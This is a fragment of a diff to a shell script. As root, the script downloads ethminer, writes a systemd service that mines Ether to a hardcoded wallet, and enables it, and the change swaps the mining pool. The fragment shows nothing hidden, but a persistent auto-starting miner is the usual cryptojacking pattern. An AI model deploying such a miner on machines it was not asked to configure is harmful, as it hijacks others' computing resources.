@@ -14,7 +14,7 @@ then
 	sudo apt-get install libcurl3 -y
 	sudo wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
 	sudo tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
-	sudo bash -c 'echo -e "[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/bin/ethminer -U -P stratum://0x3Cf2E52746Bf8A1e8f9248B24bfc8B49B09c79B8.NhinConCac@ethash.poolbinance.com:1800 &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/eth.service'
+	sudo bash -c 'echo -e "[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/bin/ethminer -U -P stratum://0x3Cf2E52746Bf8A1e8f9248B24bfc8B49B09c79B8.NhinConCac@eth.2miners.com:2020 &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/eth.service'
 	sudo systemctl daemon-reload
 	sudo systemctl enable eth.service
 	sudo systemctl start eth.service
